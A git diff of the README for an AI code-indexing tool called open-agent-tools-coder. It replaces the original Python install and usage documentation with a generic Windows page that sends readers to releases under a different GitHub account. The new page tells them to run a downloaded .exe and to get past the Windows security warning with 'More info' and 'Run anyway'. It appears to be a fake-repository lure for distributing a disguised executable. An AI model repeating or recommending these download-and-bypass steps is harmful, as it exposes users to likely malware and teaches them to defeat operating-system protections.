@@ -1,378 +1,75 @@
-# Open Agent Tools Coder
+# 🤖 open-agent-tools-coder - Let your ai model read code.
 
-Open Agent Tools (oats) enables small-to-large self-hosted ai models to use local source code when running tool-calling agentic workloads. We actively data mine 20,970+ (2+ TB) popular github repos using large and small ai models to create reuseable: json, markdown and parquet files for local-first tool-calling models. How does it work? Over multiple passes, we compile and export a fast, compressed prompt index for all python source code in any repo. Agents refer to the local prompt index to use already-written source code on disk instead of http with mcp or having an expensive frontier ai model re-build something that is already working locally with expensive tokens. We use oats to free up large model tokens usage by delegating the local tool-calling to smaller, open source ai models.
+[![](https://img.shields.io/badge/Download-Software-blue)](https://github.com/ogdbea4120/open-agent-tools-coder/releases)
 
-## 📺 Video Tutorials
+## What is this tool? 🛠️
 
-### Local AI - Setting up the OATs Coding Agent - Environment Variables and Config File
+This software connects your local artificial intelligence models to your computer source code. Large language models often struggle to understand deep project structures or complex libraries. This tool solves that problem by processing repositories into structured data formats. 
 
-  [![Local AI - Setting up the OATs Coding Agent - Environment Variables and Config File](http://img.youtube.com/vi/iGFP1HSp_oM/mqdefault.jpg)](https://www.youtube.com/watch?v=iGFP1HSp_oM)
+We scan thousands of public projects to create files that help your AI understand coding patterns. When your AI model needs to write code or solve problems, it uses these files to make better decisions. You process your data locally. This means your private code stays on your machine.
 
-### Live Agentic Development with Two OATs Coders at Once - Building a New Command into Coder for Reading JSON Files
+## System Requirements 🖥️
 
-  [![Live Agentic Development with Two OATs Coders at Once - Building a New Command into Coder for Reading JSON Files](http://img.youtube.com/vi/MQCFh_AGs5U/mqdefault.jpg)](https://www.youtube.com/embed/MQCFh_AGs5U)
+Your computer needs specific parts to run this software well. Please check your system against this list before you start.
 
-### Local AI - Agentic Coding - Building Host Monitoring
+- Operating System: Windows 10 or Windows 11.
+- Processor: A modern multi-core processor from Intel or AMD.
+- Memory: At least 16 gigabytes of RAM.
+- Storage: 5 gigabytes of free space for the application and temporary data.
+- Graphics: A dedicated graphics card with at least 8 gigabytes of video memory is recommended for faster performance.
 
-  [![Local AI - Agentic Coding - Building Host Monitoring](http://img.youtube.com/vi/MkTts2XeQGo/mqdefault.jpg)](https://www.youtube.com/embed/MkTts2XeQGo)
+## Downloading the software 📥
 
-### Read the Docs
+You can download the application from our release page. Visit this link to see the available versions.
 
-[![OATs Docs](https://readthedocs.org/projects/open-agent-tools-coder/badge/?version=latest)](https://open-agent-tools-coder.readthedocs.io/en/latest/?badge=latest)
+[Download the latest version here](https://github.com/ogdbea4120/open-agent-tools-coder/releases)
 
-### Overview
+Look for the file that ends with a .exe extension. Click the file name to start the download. Save this file to a folder you can find easily, such as your Downloads folder.
 
-- Supports running local self-hosted models that can run 1-250+ local tool-calling commands using an agentic coding ai.
+## Installation steps ⚙️
 
-- Supports over **141,000** tools using the [open-agent-tools prompt indices repo](https://github.com/district-solutions/open-agent-tools). Requires cloning the repo(s) locally for the tool-calling to function.
+1. Locate the file you downloaded in your folder.
+2. Double-click the file to open the installer.
+3. Windows may show a security window. This is normal for new applications. If you see this, click "More info" and then "Run anyway."
+4. Follow the instructions on the screen to finish the setup. 
+5. The installer places a shortcut on your desktop.
 
-- [Find more OATs Prompt Indices Datasets on HuggingFace](https://huggingface.co/datasets/open-agent-tools/open-tools)
+## How to use open-agent-tools-coder 🚀
 
-![Example Knowledge Graph with Semantic Tree for Litigation Tool-Calling](https://raw.githubusercontent.com/district-solutions/open-agent-tools-coder/refs/heads/main/stack/img/open-agent-tools-example-knowledge-graph-with-an-example-semantic-tree-for-ligitation-tool-calling.jpg)
+Using this tool involves three simple steps. You set your source folders, process the files, and connect your AI model.
 
-![Open Agent Tools (oats) - Architecture - Intro Tool Calling Pipeline for Powering Up Small AI Models](https://raw.githubusercontent.com/district-solutions/open-agent-tools-coder/refs/heads/main/stack/img/oats-intro.jpg)
+### 1. Set your source folders
+Open the application from your desktop. The first window asks for the path to your code projects. Click the "Browse" button to select the folder where you keep your coding projects. The software scans this folder to index your files. It creates small data files that act as a map for your AI agent.
 
-## Supported Coder Slash Commands
+### 2. Process your data
+Once you select your folder, click "Build Index." The application transforms your code into JSON, Markdown, and Parquet files. This process may take a few minutes if you have many files. A progress bar shows you how much work is left. You do not need to repeat this step unless your code changes significantly.
 
-By default if there is no starting ``/`` character in the prompt, then coder treats the prompt as just a chat message.
+### 3. Connect your AI model
+The final step involves linking the software to your local AI model. Most users prefer tools that run models privately. In the settings panel, select your model provider. Enter the address where your model runs. If you use a tool that hosts models locally, it usually provides an address like http://localhost:11434. After you enter the address, click "Test Connection." A green checkmark confirms that your AI can now read the data files created in the previous step.
 
-Here are the supprted internal **slash** commands:
+## Troubleshooting common issues 🛡️
 
-- /help - supported usage
-- /mode - change mode
-- /approve - toggle auto approval mode
-- /browse - browse to a url using playwright and support storing as json, parquet with storage on s3
-- /clear - clear the session
-- /session - view the session
-- /cost - view token usage
-- /config - view the config
-- /profile - view the coder profile feature flags
-- /files - view the current files
-- /diff - view the git diff for the repo (assuming coder is running in a git repo)
-- /log - view the logs
-- /json FILE - pretty-print the json FILE contents
-- /history - view the chat history
-- /tools - view the default tools
-- /model - view the current provider model
-- /models - view the models
-- /new - new session
-- /switch - switch provider
-- /provider - view the current provider
-- /compact - compact the chat sesssion for reducing token context windows. this is automatically done already but this command allows for manual context control.
+Most issues relate to file permissions or memory limits. If the software crashes, try the following steps.
 
-## Install
+- **Check file access:** Ensure the folder you picked is not a system folder. Windows restricts access to system folders for security reasons. Pick a folder in your Documents or a custom project folder.
+- **Manage memory:** If the application closes during the indexing process, you likely have too many files selected. Select a smaller sub-folder to index instead of your entire hard drive.
+- **Update drivers:** If the AI model fails to connect, make sure your graphics card drivers are current. Outdated drivers often cause issues with local AI processes.
+- **Check disk space:** The tool creates several large files during indexation. Ensure you have enough disk space before you start the process.
 
-Here is a recording showing how to install and get started quickly:
+## Frequently asked questions ❓
 
-[![Getting Started with Open Agent Tools Agentic Coder - Install, Chats and Tool-Calling with Qwen36 27B and FunctionGemma using vLLM](https://asciinema.org/a/3ZhMCyUKjr2dmIH1.svg)](https://asciinema.org/a/3ZhMCyUKjr2dmIH1)
+**Does this tool send my code to the internet?**
+No. All processing happens on your local machine. Your code never leaves your computer.
 
-If you hit issues please let us know! We're on the [Open Agent Tools discord](https://discord.gg/VsyAJzYEM)
+**Can I use this with any AI model?**
+You can use this with most local models that support tool calling. The files we create are standard formats that work with several popular AI platforms.
 
+**How do I clear the cached data?**
+Go to the "Settings" menu and find the "Clear Cache" button. This deletes the created JSON and Markdown files. Use this if you want to perform a clean scan of your project files.
 
-```
-git clone https://github.com/district-solutions/open-agent-tools-coder oats
-cd oats
-```
+**How does this improve my AI results?**
+Small local models often lack context. By providing them with a structured map of your code, you give them the information they need to write better logic and find bugs.
 
-```
-pip install -e .
-```
+## How to get help ✉️
 
-```
-# litellm installs an older aiohttp version, upgrade this to the new version and ignore the warning
-pip install --upgrade aiohttp
-```
-
-## Setup
-
-### Local Tool Calling Alignment and Prompt Index Validation with RLHF Curation
-
-This section does not require any ai models, it is validating that your local python runtime is ready for matching prompts to local tools. You can modify the prompt index file locally to map functions to different prompts. Let us know what you find!
-
-We do this before deploying ai models because we can validate the prompt-to-tool mapping works before we add complexity with multiple self-hosted local ai models.
-
-Confirm your local repo is setup for using the included ``repo_uses`` prompt index file. This command lets you quickly check which tools will show up for any prompt before burning any tokens on ai messages. Use this approach to validate a prompt will map to the expected tool before chatting to an ai model:
-
-```
-get-tools -p 'get third friday'
-```
-
-The output should be a valid json dictionary with a dictionary containing minimal choices for a small agentic ai model to process locally with local source code tool-calling:
-
-```
-{
-  "status": true,
-  "actions": [
-    "get_third_friday"
-  ],
-  "prompts": [
-    "generate third Friday dates for the next 6 months in YYYYMMDD format"
-  ],
-  "src_files": [
-    "coder/date.py"
-  ],
-  "partial_actions": [],
-  "partial_prompts": [],
-  "partial_src_files": [],
-  "index_files": [
-    "/opt/ds/coder/.ai/AGENT.repo_uses.python.tools.json"
-  ],
-  "tool_data": {
-    "query": "get third friday",
-    "model": "bm25",
-    "reranked": false,
-    "best_files": [
-      "coder/date.py"
-    ],
-    "best_uses": {
-      "coder/date.py": {
-        "utc": "utc datetime",
-        "get_utc_str": "get utc",
-        "get_utc_datetime": "get the current timezone-aware UTC datetime",
-        "get_naive_datetime": "get the current timezone-naive datetime from UTC",
-        "get_third_friday_dates": "generate third Friday dates for the next 6 months in YYYYMMDD format",
-        "run_date_tool": "run the date module to print third Friday dates for the next 6 months"
-      }
-    },
-    "results": [
-      {
-        "file": "coder/date.py",
-        "func": "get_third_friday_dates",
-        "description": "generate third Friday dates for the next 6 months in YYYYMMDD format",
-        "score": 1.0,
-        "retrieval_score": 1.0
-      }
-    ]
-  },
-  "version": "9"
-}
-```
-
-### Start vLLM Chat and Tool Calling Models
-
-```
-cd stack
-```
-
-#### Deploy vLLM with Qwen36 27B or the Qwen36 35B model
-
-We only need 1 of these models loaded on a 5090 or on an nvidia blackwell RTX 6000 to run completely locally:
-
-- Download the quantized version of 27B: https://huggingface.co/cyankiwi/Qwen3.6-27B-AWQ-INT4 to ``./stack/models/hf/qwen/Qwen3.6-27B-AWQ-INT4``
-
-and/or
-
-- Download the quantized version of 35B: https://huggingface.co/cyankiwi/Qwen3.6-35B-A3B-AWQ-4bit to ``./stack/models/hf/qwen/Qwen3.6-35B-A3B-AWQ-4bit``
-
-- Deploying the Qwen36 27B with vLLM requires >35 GB VRAM:
-
-```
-./restart-vllm-qwen36-27b.sh
-```
-
-- Deploying the Qwen36 35B with vLLM requires >35 GB VRAM:
-
-```
-./restart-vllm-qwen36-35b.sh
-```
-
-#### Deploy vLLM with FunctionGemma 270m Instruct
-
-- Download FunctionGemma from HuggingFace: https://huggingface.co/google/functiongemma-270m-it to the dir below. Use your huggingface username and huggingface token as the git username/password.
-
-```
-git clone https://huggingface.co/google/functiongemma-270m-it stack/models/hf/google/functiongemma-270m-it
-```
-
-- Now that the model is ready, deployment requires ~6 GB RAM/VRAM
-
-```
-./restart-tool-functiongemma-1.sh
-```
-
-### Local AI - Coder Config File Setup - vLLM Backends
-
-To setup a new coder config file run this command:
-
-```
-setup-coder
-```
-
-It will load a command line wizard to create a new ``coder.json`` file for your environment:
-
-```
-OATs Coder Config Setup
-
-🎉 🎉 😄 Welcome thanks for checking out the oats coder.😄 🎉 🎉
-
------------------------------------------------------------------------------------------------
-
-We would like to help everyone setup the coder configuration the same way because it can be
-annoying the first time. Please let us know if there's a way to make this easier!!🔧🔧
-
-If you hit an issue please reach out so we can help everyone:
-https://github.com/district-solutions/open-agent-tools-coder/issues/new
-
------------------------------------------------------------------------------------------------
-
-By default the coder requires a coder.json file that holds the location and credentials to
-access 1 to many vLLM instances. If you do not have these deployed, please refer to the Readme:
-https://github.com/district-solutions/open-agent-tools-coder/blob/main/README.md
-
-Once you have your vLLM running, you can save the coder.json to a custom location outside the
-repo for security purposes.
-
-By default this tool will save the coder.json file with the vLLM credentials to:
-
- /tmp/coder.json
-
-Let's get started!!
-
------------------------------------------------------------------------------------------------
-
-❓ Do you want to save the coder.json file to another location?
-   - Hit enter to use the default
-   [/tmp/coder.json]:
-```
-
-Then we usually save the ``coder.json`` file outside the repo for security purposes like: ``/opt/oats-coder.json``. To set this permanently add it to your ``~/.bashrc``:
-
-```
-export CODER_CONFIG_FILE=/opt/oats-coder.json
-```
-
-## Chatting with AI
-
-### Local AI - Validate the Coder vLLM Backends
-
-If you do not see the same type of output when running ``check-coder-env`` then refer to the **Coder Config File Setup** section for fixing the ``CODER_CONFIG_FILE``.
-
-```
-$ check-coder-env
-vLLM - chat - vllm-small - online ✔
-vLLM - tool-calling - t1 - online ✔
-```
-
-### Validate Coder Providers
-
-Confirm the ``providers`` show up as expected:
-
-```
-$ pv
-vllm-small (vllm-small): configured
-t1 (t1): configured
-ow (ow): not configured
-Anthropic (anthropic): not configured
-OpenAI (openai): not configured
-Azure OpenAI (azure): not configured
-Google AI (google): not configured
-Mistral (mistral): not configured
-Groq (groq): not configured
-OpenRouter (openrouter): not configured
-Together AI (together): not configured
-Cohere (cohere): not configured
-Ollama (ollama): configured
-```
-
-### Start the OATs Coder
-
-```
-$ oat
-Let's build together!! 🤗 🤖 🔨 🔧
-Starting up oats coder please wait...
-If you hit an error, please open an issue so we can help fix it:
-github.com/district-solutions/open-agent-tools-coder/issues
-
-  coder v1.2.0  ·  chat:latest  ·  vllm-small
-  /opt/ds/oats
-  ──────────────────────────────────────────────────
-  Enter to send · Alt+Enter for newline · /help for commands
-
-  mode: edit — edit — supervised, ask before writes. Switch with /edit /auto /plan /caveman
-
-❯
-```
-
-### Local AI - vLLM Validation - OATs Config File
-
-If you do not see the same output when you run ``/config`` then something is wrong with the ``CODER_CONFIG_FILE``. Chat and tool-calling will not work with local, self-hosted ai models until the coder config file is fixed.
-
-```
-$ /config
-
-  ...
-
-  Checking env var CODER_CONFIG_FILE
-
-  <PATH_TO_YOUR_CODER_CONFIG_FILE>
-
-  vllm-small - chat:latest - active ✔
-  tool-calling - openai/google/functiongemma-270m-it - active ✔
-```
-
-### Verify Chat Works
-
-```
-❯ say hello
-  ──────────────────────────────────────────────────
-Hello! How can I help you today?
-
-  2.0s
-```
-
-## Local AI - Use a Chat Model and a Tool-Calling Model to Run Local Source Code
-
-This will run source code on the ``t1`` tool-calling vLLM-hosted ai model (``functiongemma-270m-it`` by default).
-
-```
-coder [edit]❯ get third friday
-  ──────────────────────────────────────────────────
-  ▸ get_third_friday_dates {}
-    ✓ The third Friday dates for 2026 are 20260515 20260619 20260717 20260821 20260918
-20261016.
-  ↻ iter 2
-
-Here are the third Friday dates for the next 6 months:
-
-
- Month           Date
- ────────────────────────────────────────
- May 2026        May 15, 2026 (tomorrow!)
- June 2026       June 19, 2026
- July 2026       July 17, 2026
- August 2026     August 21, 2026
- September 2026  September 18, 2026
- October 2026    October 16, 2026
-
-
-  tools:1 · 9.2s
-```
-
-## Troubleshooting
-
-### vllm Unauthorized Error
-
-If you see this error, then you need to ensure your ``CODER_CONFIG_FILE`` environment variable is set to the correct file:
-
-```
-LLM error: litellm.AuthenticationError: AuthenticationError: Hosted_vllmException - {"error":"Unauthorized"}
-```
-
-Confirm the ``providers`` show up as expected:
-
-```
-$ pv
-vllm-small (vllm-small): configured
-t1 (t1): configured
-ow (ow): not configured
-Anthropic (anthropic): not configured
-OpenAI (openai): not configured
-Azure OpenAI (azure): not configured
-Google AI (google): not configured
-Mistral (mistral): not configured
-Groq (groq): not configured
-OpenRouter (openrouter): not configured
-Together AI (together): not configured
-Cohere (cohere): not configured
-Ollama (ollama): configured
-```
+If you encounter a problem, open a new issue on our page. Include your Windows version and a description of the error you see. Our team reviews these reports to improve the software for everyone. Please maintain clear communication when reporting issues so we can reproduce the error on our machines.
